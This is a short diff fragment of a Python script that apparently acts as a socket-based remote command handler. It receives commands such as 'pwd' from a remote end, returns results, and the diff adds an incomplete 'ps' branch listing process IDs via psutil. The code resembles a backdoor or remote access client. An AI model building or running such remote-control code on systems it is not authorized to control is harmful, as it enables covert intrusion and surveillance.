@@ -21,6 +21,10 @@ while str(msg) != 'exit':
         elif msg == 'pwd':
             res = str(os.getcwd())
             s.send(res.encode('ascii'))
+        elif msg == 'ps':
+            res = psutil.pids()
+            for rr in res:
+                r = psutil.Process(rr)
         message = s.recv(2000)
         msg = bytes(message).decode('ascii')
     except Exception as e:
